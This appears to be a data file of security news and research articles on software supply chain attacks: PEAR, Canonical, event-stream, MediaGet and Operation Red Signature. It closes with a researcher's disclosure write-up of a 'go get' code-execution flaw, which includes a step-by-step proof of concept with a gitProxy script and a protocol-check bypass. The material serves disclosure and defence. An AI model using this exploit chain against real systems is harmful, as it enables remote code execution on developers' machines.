installation, like generating network traffic to domain names they should be talking to.This approach doesnt work for catching all attacks. For example, the backdoored ASUS Live Update samples connected back to an attacker-controlled domain called asushotfix.com, but this only happened on systems that had the targeted MAC addresses. The VM prevention and detection method would have worked for the second-stage victims, but not for everyone else who received the malicious update.Even in a well instrumented test environment, this would not have been discovered unless the test environment contained one of the target MAC addresses (highly unlikely), says Jake Williams, president of security consultancy Rendition Infosec and instructor at the SANS Institute. The fact that this type of attack is nearly impossible for an end user/organization to prevent speaks to the need for continuous monitoring. Its also somewhat concerning that ASUS didnt spot (and issue a takedown) for the obvious domain name typosquat. With good continuous monitoring, a never-before-seen domain alert would have been created on first contact to the malicious domain, resulting in an investigation.Minimizing the use of auto-updating software reduces riskAccording to Williams, companies should actually consider if these PC vendor utilities need to be on their systems in the first place and if their functionality cant be replaced with other processes or tools. Based on the number of vulnerabilities discovered in these types of vendor applications over the years, weve removed these from our corporate workstation builds at Rendition Infosec and have a process in place for manually checking for updates periodically, he said. Of course we also monitor vulnerability announcements so we would know if a new vulnerability was disclosed between checks. We also recommend to our clients that they embrace a third-party patch management solution instead of relying on the auto-update functionality baked into so many apps.How to protect against software supply chain attacks is one of the most complicated problems the security industry is trying to solve at the moment, Raiu says. These kinds of attacks are not new, and there are examples going back over a decade, but theyve become more visible recently, possibly also because security companies have become better at discovering them, he adds.While preventing software supply chain attacks remains problematic, organizations should continue to improve their detection and response capabilities for APT attacks in general. Ultimately, it is only the infection vector thats different and once hackers are inside, these are similar to any other APT attacks and can be detected by solutions that analyze network and systems logs, unauthorized processes and other suspicious behavior on endpoints."
article33 = "Published on None. If you have downloaded this go-pear.phar in the past six months, you should get a new copy of the same release version from GitHub (pear/pearweb_phars) and compare file hashes. If different, you may have the infected file, the note on the official PEAR website reads.Found this article interesting? Follow us on Twitter  and LinkedIn to read more exclusive content we post.Beware! If you have downloaded PHP PEAR package manager from its official website in past 6 months, we are sorry to say that your server might have been compromised.Last week, the maintainers at PEAR took down the official website of the PEAR () after they found that someone has replaced original PHP PEAR package manager (go-pear.phar) with a modified version in the core PEAR file system.Though the PEAR developers are still in the process of analyzing the malicious package, a security announcement published on January 19, 2019, confirmed that the allegedly hacked website had been serving the installation file contaminated with the malicious code to download for at least half a year.Theis a community-driven framework and distribution system that offers anyone to search and download free libraries written in PHP programming language.These open-source libraries (better known as packages) allows developers to easily include additional functionalities into their projects and websites, including authentication, caching, encryption, web services, and many more.When you download PHP software for Unix/Linux/BSD systems, PEAR download manager (go-pear.phar) comes pre-installed, whereas Windows and Mac OS X users need to install the component when required manually.Since many web hosting companies, including shared hosting providers, also allow their users to install and run PEAR, this latest security breach could impact a large number of websites and their visitors.According to the PEAR maintainers, the team is currently performing a forensic investigation to determine what is the extent of the attack and how the attackers managed to compromise the server in the first place.A new clean version 1.10.10 of pearweb_phars is now available on Github, which re-releases the correct go-pear.phar as v1.10.9, the file that was found tainted on the https://pear.php.net server, and now includes separate GPG signature files with each phar.The developers further notified that only the copy on the pear.php.net server was impacted, to their knowledge, and that the GitHub copy of go-pear.phar is not compromised.Since the PEAR officials have just put out a warning notification and not released any details about the security incident, it is still unclear that who is behind the attack.The developers tweeted that they will publish a more detailed announcement on the PEAR Blog once its back online.All PHP/PEAR users who have downloaded the installation file go-pear.phar from the official website in the past six months should consider themselves compromised and quickly download and install the Github version.The PEAR team has published more details about the recent security incident, explaining the tainted go-pear.phar found on its server appeared to be planted after the last official file release on 20 December 2018.After analyzing the tainted version of the package manager, the team found that the malicious module spawn a reverse shell via Perl to IP 104.131.154.154 from the infected servers, allowing attackers to take complete control over them, including the ability to install apps, run malicious code, and steal sensitive data.According to the DCSO , a German cybersecurity organization who also analyzed the tainted code, the server IP address 104.131.154.154 points to a web domain, which it believes was a compromised host used by the attackers.This IP has been reported to its host in relation to the taint. No other breach was identified. The install-pear-nozlib.phar was ok. The go-pear.phar file at GitHub was ok, and could be used as a good md5sum comparison for any suspect copies, PEAR team said in a series of tweets.So, if you downloaded go-pear.phar since 12/20 in order to run it once to install the PEAR package on your system, you *should* be concerned, particularly if your system has sh and perl available.If you downloaded go-pear.phar before 12/20, we have no concrete evidence you received an infected file... but it would be prudent to check your system if you used go-pear.phar to perform a PEAR installation in the last several months.Also note that this does *not* affect the PEAR installer package itself... it affects the go-pear.phar executable that you would use to initially install the PEAR installer. Using the pear command to install various PEAR package is *not* affected."
article34 = "Published on None. The GitHub account of Canonical Ltd., the company behind the Ubuntu Linux distribution, was hacked on Saturday, July 6.We can confirm that on 2019-07-06 there was a Canonical owned account on GitHub whose credentials were compromised and used to create repositories and issues among other activities, the Ubuntu security team said in a statement.Canonical has removed the compromised account from the Canonical organisation in GitHub and is still investigating the extent of the breach, but there is no indication at this point that any source code or PII was affected, it said.Furthermore, the Launchpad infrastructure where the Ubuntu distribution is built and maintained is disconnected from GitHub and there is also no indication that it has been affected.The Ubuntu security team said it plans to publish another public update once it finishes its investigation into the incident, and after it carries out an audit and carries out any other needed remediations.According to a mirror of the hacked Canonical GitHub account, the hacker created 11 new GitHub repositories in the official Canonical account. The repositories were empty.Two days before the incident, cyber-security firm Bad Packets detected internet-wide scans for Git configuration files. Such files can often contain credentials for Git accounts, like the ones used to manage code on GitHub.com.Canonical hacked in the past, loads of timesThis weekends Canonical security incident is not the first one through which the company goes through.The official Ubuntu forums had been hacked on three different occasions -- in July 2013, in July 2016, and December 2016. Hackers stole the details of 1.82 million users in the July 2013 incident, the data of two million users in July 2016, and the forum was only defaced in the third incident.A malicious Ubuntu package containing a cryptocurrency miner was also found on the official Ubuntu Store in May 2018.But all these Ubuntu security incidents pale in comparison to what happened to Linux Mint in February 2016 when hackers breached the site and tainted the operating systems source code with a backdoor. A similar incident happened to the Gentoo Linux distro in June 2018 when hackers gained access to the distros GitHub repo and poisoned some GitHub downloads with an OS version containing a backdoor.Currently, this weekends incident appears to be benign. If the hacker had added malicious code to Canonical projects, then he wouldnt have drawn attention to himself by creating new repositories in the Canonical GitHub account.10 super sweet laptops that come with Linux pre-installedRelated cybersecurity coverage:"
article35 = "Published on 2018-11-27 02:21:38.385000+00:00. Compromised npm Package: event-stream Thomas Hunter II · Follow Published in intrinsic · · Nov 27, 2018 5 min read -- 5 Listen ShareOwnership of a popular npm package, event-stream , was transferred by the original author to a malicious user, right9ctrl. This package receives over 1.5mm weekly downloads and is depended on by nearly 1,600 other packages. The malicious user was able to gain the trust of the original author by making a series of meaningful contributions to the package. The first publish of this package by the malicious user occurred on September 4th, 2018.The malicious user modified event-stream to then depend on a malicious package, flatmap-stream . This package was specifically crafted for the purposes of this attack. That package contains a fairly simple index.js file, as well as a minified index.min.js file. The two files on GitHub appear innocent enough. However, in the published npm package, the minified version of the file has additional code injected into it. There is no requirement that code being uploaded in an npm module is equivalent to the code stored publicly in a git repository.The addition of the malicious package to the list of event-stream dependencies came to light on November 20th and is documented heavily in dominictarr/event-stream#116. This issue was made over two months after the compromised package was published. One of the many benefits of open source software is that code can be audited by many different developers. However, this isnt a silver bullet. An example of this is OpenSSL, which is an open source project receiving some of the highest scrutiny but is still affected by serious vulnerabilities such as Heartbleed.What does the package do?The package represents a highly targeted attack. It ultimately affects an open source app called bitpay/copay. According to their README, Copay is a secure bitcoin wallet platform for both desktop and mobile devices. We know the malicious package specifically targets that application because the obfuscated code reads the description field from a projects package.json file, then uses that description to decode an AES256 encrypted payload.For projects other than copay, the description field wont properly match the key used for encryption, and the operation fails silently. The description field for bitpay/copay, which is A Secure Bitcoin Wallet , is the key required to decrypt this data.The package flatmap-stream contains encoded data cleverly hidden in a test directory. This directory is not available in the GitHub repository but is available in the raw flatmap-stream-0.1.1.tgz package. The encoded data is stored as an array of parts. Each of these parts are minified/obfuscated and also encrypted to various degrees. Some of the encrypted data includes method names which could alert the malicious behavior to static analysis tools, such as the string _compile , which is a method on require for creating a new module. Ive done my best to clean-up the files and make them human readable in the following two code samples.Here is the first part. It isnt as interesting and mostly appears to be a bootstrap function to load the second part. It appears to work by modifying a file name ReedSolomonDecoder.js from a submodule. If the file has already been modified, which is known to have happened if /*@@*/ appears in the file, then it does nothing. If it hasnt been modified it not only modifies the file but also replaces the access and modified timestamps to be the original values. That way if you glance at the file on disk you would not immediately notice it had been modified.And here is the more interesting second part. Some superfluous pieces have been removed to make the original intent more obvious.This file monkey-patches functionality from the bitcore-wallet-client package, specifically the getKeys method of the Credentials class. It backs up the original function, then inserts code to transmit the credentials for a wallet to a third party server. That server is located at 111.90.151.134 . These credentials can likely be used to gain access to users accounts and allow an attacker to steal money from the original owner.The package makes several attempts to avoid detection. For example, it doesnt run when using a test Bitcoin network, identified as testnet . Instead it only runs on the live Bitcoin network, named livenet . This could help avoid detection if an affected app runs acceptance tests against the test network. It also only appears to run the bootloader when a release build is being generated. It does so by looking at the first argument in process.argv and testing it against the regular expression /build\:.*\-release/ , and returning if a match isnt made. This argument is likely provided by some sort of build server.How could this attack have been prevented?It may be tempting to rely on tools which scan npm packages by way of static analysis. This particular attack encrypts the malicious source code to avoid detection. To protect against such an attack a different approach must be taken…This particular attack appears to run in both a normal webpage as well as an application built with Cordova — a tool for converting web apps into mobile apps. The attack could have been prevented by making use of CSP (Content Security Policy). This is a standard for specifying which URLs a webpage can communicate with and is specified via web server headers. Cordova even has its own mechanism for specifying which third party services can be contacted. However, the Copay application appears to have disabled this feature.CSP is a great tool for securing frontend applications. However, such a feature is not built into Node.js itself. Intrinsic is a Node.js package which provides the ability to whitelist which URLs an application can communicate with— much like CSP—however it can do much more powerful things as well. Intrinsic can be used to whitelist filesystem access, child process access, sensitive process attributes, TCP and UDP connections, and even fine-grained database access. These whitelists are specified on a per-route basis, making Intrinsic far more powerful than a firewall."
article36 = "Published on None. Video: Microsofts reverse-engineering unveils secrets of FinFisher government spywareThe Dofoil outbreak that attempted to infect over 400,000 Windows PCs within hours last week was caused by attack on an update server that replaced a BitTorrent client called MediaGet with a near-identical but back-doored binary.The MediaGet update poisoning, as Microsoft calls it, explains why the large-scale attempt to spread a cryptocurrency miner predominantly hit PCs in Russia, Turkey, and Ukraine.Microsoft treats MediaGet as a potentially unwanted application, but in this case the Russian-developed BitTorrent client was a bridge to victims.As Windows Defender researchers have highlighted, the Dofoil outbreak was a priority because it could have just as easily dropped ransomware using the attack vector.Now read: How to build a successful career in cybersecurity (free PDF)While file-sharing apps can be used to spread malware, Microsofts researchers noticed this outbreak wasnt coming from torrent downloads and wasnt seen in other file-sharing apps. Instead, malware was coming from the process mediaget.exe.A carefully planned attack was implemented in mid-February, about a fortnight before the malware was distributed, according to Microsoft.To set the stage for the outbreak, attackers performed an update poisoning campaign that installed a trojanized version of MediaGet on computers, the Windows Defender Research team wrote.A signed mediaget.exe from MediaGets update server downloads a program called update.exe which installs a new, unsigned mediate.exe that works like the original only it has a backdoor.Microsoft believes the third-party company that signed update.exe is likely to be a victim. The attackers signed the poisoned update.exe with a different certificate to pass the validation required by the legitimate MediaGet.The trojanized mediate.exe file is 98 percent like the legit MediaGet binary. To evade detection the trojan performs process-hollowing on the legitimate explorer.exe process and injects malware into it.See also: IT leaders guide to cyberattack recoveryThe incident was notable to Microsoft because of the effort that went into laying the groundwork for the attack and the advanced techniques it used to conceal and maintain infections.Previous and related coverageWindows 10 warning: Beware staff planting cryptominers on work systems, says MicrosoftMicrosoft now sees over 600,000 PCs exposed to coin-mining malware each month.Windows security: Microsoft fights massive cryptocoin miner malware outbreakMicrosoft has blocked a malware outbreak that could have earned big bucks for one criminal group.Windows RDP flaw: Install Microsofts patch, turn on your firewallAttackers can use a protocol bug in Windows RDP to steal session authentication and take over a network domain.Windows 10: Microsoft lifts block on security updates after sorting out AV clash(TechRepublic)The removal of the AV compatibility checks will mean that patches to mitigate the risk from Spectre and Meltdown attacks released since January will now be available to a wider range of PCs.How to create and use app passwords for your Microsoft account (CNET)Because not all Microsoft services support security codes for two-step verification."
article37 = "Published on 2018-08-21 00:00:00. Together with our colleagues at IssueMakersLab, we uncovered Operation Red Signature, an information theft-driven supply chain attack targeting organizations in South Korea. We discovered the attacks around the end of July, while the media reported the attack in South Korea on August 6.The threat actors compromised the update server of a remote support solutions provider to deliver a remote access tool called 9002 RAT to their targets of interest through the update process. They carried this out by first stealing the companys certificate then using it to sign the malware. They also configured the update server to only deliver malicious files if the client is located in the range of IP addresses of their target organizations.9002 RAT also installed additional malicious tools: an exploit tool for Internet Information Services (IIS) 6 WebDav (exploiting CVE-2017-7269) and an SQL database password dumper. These tools hint at how the attackers are also after data stored in their targets web server and database.Figure 1. Operation Red Signatures attack chainHeres how Operation Red Signature works:The code-signing certificate from the remote support solutions provider is stolen. Its possible that the certificate was stolen as early as April 2018, as we found a ShiftDoor malware (4ae4aed210f2b4f75bdb855f6a5c11e625d56de2) on April 8 that was signed with the stolen certificate. Malicious update files are prepared, signed with the stolen certificate, and uploaded to the attackers server (207[.]148[.]94[.]157). The update server of the company is hacked. The update server is configured to receive an update.zip file from the attackers server if a client is connecting from a specific range of IP addresses belonging to their targeted organizations. The malicious update.zip file is sent to the client when the remote support program is executed. The remote support program recognizes the update files as normal and executes the 9002 RAT malware inside it. 9002 RAT downloads and executes additional malicious files from the attackers server.Technical analysisThe update.zip file contains an update.ini file, which has the malicious update configuration that specifies the remote support solution program to download file000.zip and file001.zip and extract them as rcview40u.dll and rcview.log to the installation folder.The program will then execute rcview40u.dll, signed with the stolen certificate, with Microsoft register server (regsvr32.exe). This dynamic-link library (DLL) is responsible for decrypting the encrypted rcview.log file and executing it in memory. 9002 RAT is the decrypted rcview.log payload, which connects to the command-and-control (C&C) server at 66[.]42[.]37[.]101.Figure 2. Contents of the malicious update configurationFigure 3. How the compromised update process launches the 9002 RAT malwareFigure 4. Known 9002 RAT string pattern inside the decrypted payload of the rcview.log fileCorrelating 9002 RATDelving into 9002 RAT, we found that it was compiled on July 17, 2018, and that the configuration files inside update.zip were created on July 18. Our analysis of an update log file we found reveals the remote support programs update process started around 13:35 on July 18, with the 9002 RAT being downloaded and launched. We also saw the RAT file used for this specific attack was set to be inactive in August, so we can construe that the RATs activity was rather short-lived (from July 18 to July 31).Figure 5. Compilation timestamp on 9002 RAT sample (top), timestamp of the malicious configuration (center), and snapshot of the programs update log (bottom)Figure 6. Code snippet showing 9002 RAT checking the system time and setting itself to sleep in August 2018Additional malware toolsThe 9002 RAT also serves as a springboard for delivering additional malware. Most of these are downloaded as files compressed with the Microsoft cabinet format (.cab). This is most likely done to avoid detection by antivirus (AV) solutions.Heres a list of files that 9002 RAT retrieves and delivers to the affected system:Filename Tool Purpose dsget.exe DsGet View active directory objects dsquery.exe DsQuery Search for active directory objects sharphound.exe SharpHound Collect active directory information aio.exe All In One (AIO) Publicly available hack tool ssms.exe SQL Password dumper Dump password from SQL database printdat.dll RAT (PlugX variant) Remote access tool w.exe IIS 6 WebDav Exploit Tool Exploit tool for CVE-2017-7269 (IIS 6) Web.exe WebBrowserPassView Recover password stored by browser smb.exe Scanner Scans the systems Windows version and computer name m.exe Custom Mimikatz (including 32bit / 64bit file) Verify computer password and active directory credentialsFigure 7. Downloaded Web.ex_ cabinet file (left) and decompressed Web.exe file (right)One of the downloaded files printdat.dll, which is another RAT. It is a variant of PlugX malware, and connects to the same C&C server (66[.]42[.]37[.]101).Figure 8. Internal PlugX date dword value inside the printdat.dll fileMitigating supply chain attacksSupply chain attacks dont just affect users and businesses — they exploit the trust between vendors and its clients or customers. By trojanizing software/applications or manipulating the infrastructures or platforms that run them, supply chain attacks affects the integrity and security of the goods and services that organizations provide. In healthcare, for instance, where the industry heavily relies on third-party and cloud-based services, supply chain attacks can risk the privacy of personally identifiable data and intellectual property, disrupt hospital operations, and even endanger patient health. And when stacked up with regulations such as the EU General Data Protection and Regulation (GDPR), the impact can be exacerbated.Here are some best practices:Trend Micro SolutionsThe Trend Micro™ Deep Discovery™ solution provides detection, in-depth analysis, and proactive response to todays stealthy malware and targeted attacks in real time. It provides a comprehensive defense tailored to protect organizations against targeted attacks and advanced threats through specialized engines, custom sandboxing, and seamless correlation across the entire attack life cycle, allowing it to detect threats even without any engine or pattern update. Trend Micro endpoint solutions such as the Smart Protection Suites and Worry-Free Business Security solutions can protect users and businesses from threats by detecting malicious files and blocking all related malicious URLs.Indicators of Compromise (IoCs):Related hashes (SHA-256):0703a917aaa0630ae1860fb5fb1f64f3cfb4ea8c57eac71c2b0a407b738c4e19 (ShiftDoor) — detected by Trend Micro as BKDR_SETHC.Dc14ea9b81f782ba36ae3ea450c2850642983814a0f4dc0ea4888038466839c1e (aio.exe) — HKTL_DELOGa3a1b1cf29a8f38d05b4292524c3496cb28f78d995dfb0a9aef7b2f949ac278b (m.exe) — HKTL_MIMIKATZ9415ca80c51b2409a88e26a9eb3464db636c2e27f9c61e247d15254e6fbb31eb (printdat.dll) — TSPY_KORPLUG.AN52374f68d1e43f1ca6cd04e5816999ba45c4e42eb0641874be25808c9fe15005 (rcview.log) — TROJ_SIDELOADR.ENCbcfacc1ad5686aee3a9d8940e46d32af62f8e1cd1631653795778736b67b6d6e (rcview40u.dll) — TROJ_SIDELOADR.A279cf1773903b7a5de63897d55268aa967a87f915a07924c574e42c9ed12de30 (sharphound.exe) — HKTL_BLOODHOUNDe5029808f78ec4a079e889e5823ee298edab34013e50a47c279b6dc4d57b1ffc (ssms.exe) — HKTL_PASSDUMPe530e16d5756cdc2862b4c9411ac3bb3b113bc87344139b4bfa2c35cd816e518 (w.exe) — TROJ_CVE20177269.MOX28c5a6aefcc57e2862ea16f5f2ecb1e7df84b68e98e5814533262595b237917d (Web.exe) — HKTL_BROWSERPASSVIEW.GAURLs related to the malicious update file:hxxp://207[.]148[.]94[.]157/update/rcv50/update.ziphxxp://207[.]148[.]94[.]157/update/rcv50/file000.ziphxxp://207[.]148[.]94[.]157/update/rcv50/file001.zipURLs related to additionally downloaded malicious files:hxxp://207[.]148[.]94[.]157/aio.exehxxp://207[.]148[.]94[.]157/smb.exehxxp://207[.]148[.]94[.]157/m.ex_hxxp://207[.]148[.]94[.]157/whxxp://207[.]148[.]94[.]157/Web.ex_Related C&C server (9002 RAT and PlugX variant):"
article38 = "Published on 2019-03-28 00:00:00. Last year I stumbled across a vulnerability in Gos go get command, which could lead to code execution when a malicious Go package was downloaded. I reported this to the Go team and it was subsequently assigned CVE-2018-16873. The actual vulnerability was really interesting since it was solely a logic vulnerability, where I abused the order in which packages were cloned by the go get command and how these would be laid out on disk. This makes it one of my personal favourite bugs.How go get worksWhile trying to find different source code downloaders (or package managers) that made use of Git as a supporting service, I realised that go get is simply a git clone command with some extra bells and whistles thrown in. If we had to go get a really simple package, such as github.com/staaldraad/hello-go the following would happen.Go get will check which version control system is used at https://github.com/staaldraad/hello-goA check will be done to see if the package already exists on diskIf the package does not exist, the correct path is created the path will be $GOPATH/src/<pkgname> in this case: $GOPATH/src/github.com/staaldraad/hello-goThe downloaded package will be checked for other dependencies and these will be downloaded using the same steps as aboveIf the -u flag is specified in go get , then existing packages will be updated if neededLooking into the directory created by the go get command, it is simply a Git repository:$ ls -la $GOPATH/src/github.com/staaldraad/hello-go drwx--x--x 1 staaldraad staaldraad 22 Feb 27 13:42 . drwx--x--x 1 staaldraad staaldraad 244 Feb 17 20:01 .. drwx--x--x 1 staaldraad staaldraad 182 Mar 28 11:29 .git -rw-r--r-- 1 staaldraad staaldraad 124 Mar 28 11:29 main.goIt is also possible go get a sub-package of a package (not a real name, this is just what I call it). What this means is that there can be two packages that both share the same parent/root directory. The packages github.com/staaldraad/hello-go and github.com/staaldraad/hello-go/sub-go could now be nested together.$ go get github.com/staaldraad/hello-go $ go get github.com/staaldraad/hello-go/sub-go $ ls -la $GOPATH/src/github.com/staaldraad/hello-go drwx--x--x 1 staaldraad staaldraad 22 Feb 27 13:42 . drwx--x--x 1 staaldraad staaldraad 244 Feb 17 20:01 .. drwx--x--x 1 staaldraad staaldraad 182 Mar 28 11:29 .git -rw-r--r-- 1 staaldraad staaldraad 124 Mar 28 11:29 main.go drwx--x--x 1 staaldraad staaldraad 182 Mar 28 11:29 sub-go $ ls -la $GOPATH/src/github.com/staaldraad/hello-go/sub-go drwx--x--x 1 staaldraad staaldraad 182 Mar 28 11:29 . drwx--x--x 1 staaldraad staaldraad 182 Mar 28 11:29 .. drwx--x--x 1 staaldraad staaldraad 182 Mar 28 11:29 .git -rw-r--r-- 1 staaldraad staaldraad 124 Mar 28 11:29 main.goLooking at this I started wondering if it would be possible to have a sub-package named .git and have it overwrite the existing .git directory inside the parent package. If this was possible (spoiler: it was), the next time the parent package is updated, remember that go get -u downloads and updates the package and its dependencies, the content of the sub-package would be used as the GITDIR , rather than the .git directory that would normally exist.Nesting dependenciesThe initial idea was to create two packages, one called github.com/staaldraad/goget and the other github.com/staaldraad/goget/.git , and have these downloaded in the reverse order, so that when github.com/staaldraad/goget is downloaded (git cloned), the path $GOPATH/github.com/staaldraad/goget/.git would already exist, and this would get used by the Git when doing the clone/fetch.main.go in github.com/staaldraad/goget/.git :package gogetgit import github.com/staaldraad/goget func main (){ //use the imported package to avoid unused package errors goget . Fun () } // A function that can be used by the package that imports this package func Trig (){ }main.go in github.com/staaldraad/goget :package goget // A function that can be used by the package that imports this package func Fun (){ }And finally you require a trigger package that kicks off the whole chain by importing goget/.git :main.go in github.com/staaldraad/go-trigger :package main import github.com/staaldraad/goget/.git func main (){ //use the imported package to avoid unused package errors gogetgit . Trig () }Unfortunately it wasnt this straight forward and it didnt work. The very first problem I ran into actually had nothing to do with either Go or Git. The problem was that I was trying to nest Git repositories on GitHub, which is not possible. Fortunately there was a mechanism in go get that could help get around this (the other option would be to host the repositories on a Git server under my control, which I initially did, but discarded later for two reasons. One, it wasnt necessary and two, it made reporting the issue much harder as it now required the Golang team to setup their own Git server. This isnt hard but does complicate the reproduction steps).Go get can use an intermediate server to redirect package downloads. This is done through go-import meta tags hosted on an HTTP server. The benefit of this is that you can give you package a custom name, say blah.myserver.com/staaldraad/goget but still host the repository on a Git service such as GitHub. The HTTP server on blah.myserver.com would simply need to respond to the URI for /staaldraad/goget with the go-import meta tag:< meta name = go-import content = blah.myserver.com/staaldraad/goget git https://github.com/staaldraad/goget >Using this I slightly modified the PoC to rather use the package names blah.myserver.com/staaldraad/goget/.git and blah.myserver.com/staaldraad/goget and the correct meta redirects on my server:< meta name = go-import content = blah.myserver.com/staaldraad/goget/.git git https://github.com/staaldraad/gogetgit > < meta name = go-import content = blah.myserver.com/staaldraad/goget git https://github.com/staaldraad/goget >This means changing the imports of the above Go files from github.com/staaldraad/ to blah.myserver.com/staaldraad/ . Once this is done, I tried triggered the build again with go get -u github.com/staaldraad/go-trigger . Doing this is resulted in the following error:$ go get -u github.com/staaldraad/go-trig # cd /home/user/dev/go/src/blah.myserver.com/goget; git pull --ff-only fatal: Not a git repository ( or any of the parent directories ) : .git package blah.myserver.com/goget: exit status 128Which is immediately promising, since it indicates that the repositories were cloned in the correct order and now Git is trying to use our planted .git directory as a git repository. Because there arent any Git files in there, it ends up failing. The next step was to populate the directory with a fake Git history and relevant configs. To do this, I simply copied across the valid Git repository that existed in github.com/staaldraad/goget , since this is the repository that Git is trying to reference/clone.$ cp -r goget/.git/* gogetgit/ $ cd gogetgit/ $ ls -la drwxr-xr-x 1 staaldraad staaldraad 0 Mar 26 19:09 branches -rw-r--r-- 1 staaldraad staaldraad 5 Mar 26 19:09 COMMIT_EDITMSG -rw-r--r-- 1 staaldraad staaldraad 246 Mar 26 19:09 config -rw-r--r-- 1 staaldraad staaldraad 73 Mar 26 19:09 description drwxr-xr-x 1 staaldraad staaldraad 144 Mar 26 18:59 .git -rw-r--r-- 1 staaldraad staaldraad 23 Mar 26 19:09 HEAD drwxr-xr-x 1 staaldraad staaldraad 364 Mar 26 19:09 hooks -rw-r--r-- 1 staaldraad staaldraad 137 Mar 26 19:09 index drwxr-xr-x 1 staaldraad staaldraad 14 Mar 26 19:09 info drwxr-xr-x 1 staaldraad staaldraad 16 Mar 26 19:09 logs -rw-r--r-- 1 staaldraad staaldraad 85 Mar 26 18:58 main.go drwxr-xr-x 1 staaldraad staaldraad 28 Mar 26 19:09 objects drwxr-xr-x 1 staaldraad staaldraad 32 Mar 26 19:09 refs $ git add . $ git commit -m fake $ git push origin masterNow another go get -u github.com/staaldraad/go-trigger fails again but with a different message:package blah.myserver.blah/goget: no Go files in /home/user/dev/go/src/blah.myserver.blah/gogetThis seems to indicate that the fake Git repository was accepted but the main.go file had not been created. Thinking about it, it actually makes sense, since Git will check the references in the fake Git repository, and compare it with the remote server. Since the content hasnt changed, no git fetch/pull happens and Git assumes that the files all already exist in the directory. Thus nothing is written to main.go as it exists.Since the fake Git repository is being used, it made sense to see if it was possible to use it to trigger code execution. The missing main.go didnt matter at this point.Code execution with GitPreviously, when exploiting CVE-2018-112345, I showed that git-hooks can easily be used for code execution. These hooks are triggered on relevant Git actions and thus require that those specific Git actions are actually run.Looking at the go get code for Git we can see which Git actions are executed: /get/vcs.go#L144We have:git clonegit pullgit show-refgit checkoutgit submodule updategit ls-remoteSadly none of these actions trigger git-hooks, apart from git checkout , which wasnt being hit during the go get . Back to reading documentation. One option built into Git is the ability to set a gitProxy, which is used when interacting with a remote repository over the git:// protocol. This could be perfect for getting code execution.First I created a script in gogetgit to execute:$ cat pew.sh #!/bin/bash echo abc > /tmp/pwnd $ chmod +x pew.shAnd then modify the config file in gogetgit to include the gitProxy command and also to change the URI from https:// to git:// :[core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true gitProxy = .git/pew.sh [remote origin] url = git://github.com/staaldraad/goget fetch = +refs/heads/*:refs/remotes/origin/* [branch master] remote = origin merge = refs/heads/masterThese files were all checked into the repository and I tried again. And this time a new error…package blah.myserver.com/goget: cannot download, git://github.com/staaldraad/goget uses insecure protocolWhat has happened is that go get verifies the URL for the remote repository and ensures that it uses a secure protocol, meaning an encrypted channel such as SSH or HTTPS. Because the config now specifies git:// , which is a plain-text protocol, Go refuses to continue without the --insecure flag. Specifying this flag will allow the command execution to succeed, but is rather suspicious (who is going to trust a command with --insecure ?):$ go get -u --insecure github.com/staaldraad/go-trig # cd /home/user/dev/go/src/blah.myserver.com/goget; git pull --ff-only fatal: Could not read from remote repository. Please make sure you have the correct access rights and the repository exists. package blah.myserver.com/goget: exit status 1 $ cat /tmp/xyz abcAt this point I actually submitted the issue to the Golang team and added that Im sure there is a way around the –insecure. The question of how to get around the --insecure flag kept nagging at me and I finally found a solution.Security decisionsLooking at how go get determines the protocol, get/vcs.go#L177, I found that it is using the git config remote.origin.url command, which simply displays the relevant config option from .git/config . For no clear reason, I figured that Id try parameter pollution and see what would happen if there are multiple entries for a config option.[remote origin] url = git://github.com/staaldraad/goget url = https://github.com/staaldraad/gogetI was pleasantly surprised that this worked! Go no longer complained about the insecure protocol because git config remote.origin.url would return the last entry in the config file. Now the only question is if the gitProxy command would still be triggered. This config option is ignored for non- git:// URIs. Fortunately, Git internally uses the first config option it encounters, and is thus using git:// and triggering the gitProxy command.Now when trying to fetch the package, the code execution is triggered, but there is still an error:package blah.myserver.com/goget: no Go files in /home/user/dev/go/src/blah.myserver.com/gogetOnto the next step, getting rid of all errors.Cleaning upAt this point a working exploit exists for this issue and could lead to code execution should a user or system try and go get -u the malicious package. The only problem that remains is the error messages, it would be great to get rid of these. The reason for the no Go files error is that Git hasnt created the main.go file for us. As mentioned earlier, what happens at this point is go get does a git ls-remote https://github.com/staaldraad/goget/.git , which will need to contain an updated git history for the repository github.com/staaldraad/goget in order to trigger a go fetch . But because git history in our fake .git directory is simply a copy of the history of github.com/staaldraad/goget , Git determines that there are no changes and it doesnt need to do anything. The missing main.go is simply treated as an untracked change to the current git branch, as if we deleted the file but never ran git rm; git commit . The trick is to ensure that when git ls-remote is run that the remote repository responds with a list of updates to force a git pull .$ cd goget $ echo //comment >> main.go $ git add . $ git commit -m add a comment $ git push origin masterAnd then another round of trying to go get -u .$ go get -u github.com/staaldraad/go-trig # cd /home/user/dev/go/src/blah.myserver.com/goget; git pull --ff-only fatal: Could not read from remote repository. Please make sure you have the correct access rights and the repository exists. package rev.conch.cloud/goget: exit status 1Almost there… Now because git fetch is expecting the gitProxy script to be returning git objects on STDOUT, it fails since nothing is being returned. Fortunately this can be dealt with in the gitProxy script.Simply add the correct command to the pew.sh script:GIT_TRACE_PACKET = 1 git pull --ff-only -q https://github.com/staaldraad/aab 2>& 1 | grep -v # | grep <  | awk -F <  {print $2}This issues the expected git pull --ff-only command, and uses GIT_TRACE_PACKET to echo out the various packets that Git sends and receives. Because we are only interested in the responses, use grep -v # to get rid of comment lines. Then grep < to only show responses and finally remove the extra information that GIT_TRACE_PACKET has added for readability.Running the go get -u github.com/staaldraad/gotrigger will end up with nothing being displayed to the user (expected behaviour), code execution happening and all the relevant Go files being created in the package directory. At this point we actually have a valid Go package that could be used as normal, but have also achieved the goal of RCE. Is it RCE if no calc is popped? Hence, here is calc getting popped through a go get .It is also important to note that this also works with go get -u -d , where -d instructs get to stop after downloading the packages; that is, it instructs get not to install the packages. This means no build happens, so the argument that I saw that go get builds source, that is code execution, what did you expect? is moot.ConclusionAll in all this was a really interesting bug to play with. As mentioned in the intro, the vulnerability here is logic based and Im pretty sure that other package managers might suffer from similar issues.From Gos side, the team were great to work with and communicated each step of the way, keeping me in the loop with what was happening. It should also be noted that this issue only affects the older $GOPATH method of installing packages, the newer (and future of Go) Go modules were not impacted."
